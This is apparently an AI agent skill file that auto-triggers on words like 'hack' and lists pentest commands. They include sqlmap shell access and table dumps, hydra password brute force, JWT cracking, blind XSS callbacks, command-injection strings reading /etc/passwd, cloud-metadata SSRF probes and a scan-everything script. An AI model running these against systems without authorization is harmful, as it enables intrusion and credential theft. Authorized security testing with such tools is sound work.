---
name: pentest
description: "Hacker-style security testing: pentesting, vulnerability scanning, OWASP, ZAP, SQLMap, Nuclei, Semgrep"
version: "1.0.0"
priority: critical
phase: any
category: [security]
tech_stack:
  languages: [all]
scale: [all]
auto_invoke:
  enabled: true
  conditions:
    - command: "/pentest"
      reason: "Pentest invocation"
    - phrase: ["pentest", "penetration test", "hacking", "vulnerability scan"]
      reason: "Security testing intent"
    - phrase: ["owasp", "zap", "sqlmap", "nuclei", "semgrep"]
      reason: "Security tool mentioned"
triggers:
  phrases:
    - "hack"
    - "pentest"
    - "penetration"
    - "vulnerability"
    - "exploit"
    - "security scan"
    - "owasp"
    - "sql injection"
    - "xss"
    - "csrf"
    - "rce"
    - "lfi"
    - "rfi"
    - "ssrf"
    - "ssti"
capabilities:
  - implementation
  - analysis
  - discovery
integrates_with: [security, audit]
source:
  origin: local
author: TheVoidSyntax
---

# 🔴 PENTEST - Hacker-Style Security Testing

**Pentesting tools, vulnerability scanner, OWASP Top 10, automated security testing.**

---

## ⚡ QUICK START

```bash
/pentest                    # Run all security scans
/pentest --scan <url>      # Scan specific URL
/pentest --owasp           # OWASP Top 10 check
/pentest --api <endpoint>  # API security test
```

---

## 🛠️ SECURITY TOOLS SUITE

### 1. Vulnerability Scanner

#### Nuclei - Fast Template-Based Scanner
```bash
# Install
nuclei -update-templates

# Scan for CVEs
nuclei -u https://target.com

# Scan with specific severity
nuclei -u https://target.com -severity critical,high,medium

# Custom wordlist
nuclei -u https://target.com -w exploits.txt

# Scan multiple targets
nuclei -l urls.txt -export output.json
```

#### OWASP ZAP - Web App Scanner
```bash
# Quick scan
zap-cli quick-scan https://target.com

# Spider scan
zap-cli spider https://target.com

# Active scan
zap-cli active-scan https://target.com

# API scan (OpenAPI/Swagger)
zap-cli api-scan https://api.target.com/openapi.json

# Report
zap-cli report -o report.html
```

### 2. SQL Injection

#### SQLMap - Automatic SQL Injection
```bash
# Basic test
sqlmap -u "https://target.com/?id=1"

# Forms test
sqlmap -u "https://target.com/login.php" --data="user=admin&pass=*"

# DBMS fingerprint
sqlmap -u "https://target.com/?id=1" --fingerprint

# Get shell
sqlmap -u "https://target.com/?id=1" --os-shell

# List databases
sqlmap -u "https://target.com/?id=1" --dbs

# Dump data
sqlmap -u "https://target.com/?id=1" -D dbname -T users --dump
```

### 3. XSS Scanner

#### dalfox + GF patterns
```bash
# Install
go install github.com/hahwul/dalfox/v2@latest

# Scan reflected XSS
dalfox url https://target.com/?q=test

# Blind XSS with callback
dalfox url https://target.com/?q=test --blind https://your.xss.ht

# GF patterns
echo "https://target.com" | gf xss | dalfox pipe
```

### 4. API Security

#### HTTPoxy, SSRF, CRLF Tests
```bash
# FFUF for fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ

# Headers test
ffuf -w headers.txt -u https://target.com/ -H "FUZZ: test" -mc 200

# Subdomain takeover
ffuf -w subdomains.txt -u https://FUZZ.target.com

# API enumeration
ffuf -w endpoints.txt -u https://api.target.com/FUZZ -X POST -d '{"test":"FUZZ"}' -H "Content-Type: application/json"
```

### 5. Directory/File Discovery

#### FFUF + Dirb
```bash
# Directory brute force
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ

# Extensions
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.html,.js,.txt

# Recursive
ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -depth 2

# Git discovery
ffuf -w wordlist.txt -u https://target.com/.FUZZ -mc 200,403
```

### 6. Subdomain Enumeration

```bash
# Subfinder
subfinder -d target.com

# Assetfinder
assetfinder target.com | httprobe

# amass
amass enum -passive -d target.com

# Shuffledns + massdns
cat subdomains.txt | shuffledns -r resolvers.txt | massdns
```

---

## 🔍 OWASP TOP 10 CHECKLIST

### A01 - Broken Access Control
```bash
# IDOR test
# Check /api/users/:id vs /api/users/1 vs /api/users/999999

# Privilege escalation
# Test admin endpoints as regular user

# Mass assignment
curl -X POST /api/update -d '{"role":"admin"}'
```

### A02 - Cryptographic Failures
```bash
# Check for HTTP
curl -I https://target.com | grep -E "(HTTP|https)"

# Check SSL/TLS
testssl.sh https://target.com

# Find sensitive data exposure
grep -r "password" --include="*.js" https://target.com/
```

### A03 - Injection
```bash
# SQLi
sqlmap -u "https://target.com/?q=test"

# XSS
dalfox url https://target.com/?q=test

# Command injection
# Test ; ls, | cat /etc/passwd

# SSRF
curl "https://target.com/fetch?url=http://localhost/admin"
```

### A04 - Insecure Design
```bash
# Rate limiting test
for i in {1..100}; do curl -s https://target.com/api/test; done

# Brute force login
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

### A05 - Security Misconfiguration
```bash
# Check for default creds
# admin:admin, guest:guest, test:test

# .git disclosure
curl https://target.com/.git/config

# Directory listing
curl https://target.com/uploads/ | grep -i "Index of"

# Open .env
curl https://target.com/.env
```

### A06 - Vulnerable Components
```bash
# NPM audit
npm audit

# Snyk
snyk test

# Trivy (Docker)
trivy image vulnerable-app:latest
```

### A07 - Auth Failures
```bash
# Weak password policy test
# Try common passwords

# Session fixation
# Login -> Get cookie -> Logout -> Use old cookie

# JWT brute force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

### A08 - Software Integrity
```bash
# Supply chain attack check
# Verify package integrity
# Check for typosquatting (reqquests vs requests)

# Insecure dependencies
npm ls --depth=0
```

### A09 - Logging Failures
```bash
# Check if errors are logged with IP, timestamp
# Test for log injection
curl "https://target.com/search?q=<script>alert(1)</script>"
```

### A10 - SSRF
```bash
# Localhost access
curl "https://target.com/fetch?url=http://127.0.0.1:22"
curl "https://target.com/fetch?url=http://localhost/admin"

# Cloud metadata
curl "http://169.254.169.254/latest/meta-data/"
```

---

## 🚀 AUTOMATED SCAN SCRIPT

```bash
#!/bin/bash
TARGET=$1

echo "[*] Reconnaissance..."
subfinder -d $TARGET | httprobe > live.txt

echo "[*] Port Scan..."
nmap -sV -iL live.txt -oA portscan

echo "[*] Nuclei Scan..."
nuclei -l live.txt -t vulnerabilities/ -o nuclei.txt

echo "[*] SQLMap..."
for url in $(cat live.txt); do
  sqlmap -u "$url" --batch --smart --level=2
done

echo "[*] XSS Scan..."
for url in $(cat live.txt); do
  dalfox url "$url" -o dalfox-$TARGET.txt
done

echo "[*] Report Generated"
```

---

## 🎯 ONE-LINER COMMANDS

```bash
# Quick full scan
nuclei -u target.com && dalfox url target.com && sqlmap -u target.com --batch

# API security
ffuf -w wordlist.txt -u https://api.target.com/FUZZ -X POST -d '{"key":"FUZZ"}'

# Subdomain takeover
subfinder -d target.com | naabu | nuclei -t takeover/

# Auth bypass
hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Full OWASP check
zap-cli quick-scan https://target.com && nuclei -t cves/ -l targets.txt
```

---

## 📋 REPORT TEMPLATE

```
# SECURITY ASSESSMENT REPORT
## Target: [URL]
## Date: [DATE]
## Assessed by: PENTEST SKILL

## FINDINGS

### CRITICAL
| ID | Finding | Impact | Remediation |
|----|---------|--------|-------------|
| P1 | SQL Injection in /api/search | Data breach | Use parameterized queries |
| P2 | RCE via file upload | Full system access | Validate file types, sanitize filenames |

### HIGH
| ID | Finding | Impact | Remediation |
|----|---------|--------|-------------|
| H1 | XSS in /search | Session hijacking | Output encoding |
| H2 | IDOR in /api/users/:id | Unauthorized access | Check ownership |

## RECOMMENDATIONS
1. Implement WAF
2. Regular penetration testing
3. Security awareness training
```

---

*Skill: /pentest | Priority: CRITICAL | Auto-invoke: ENABLED*
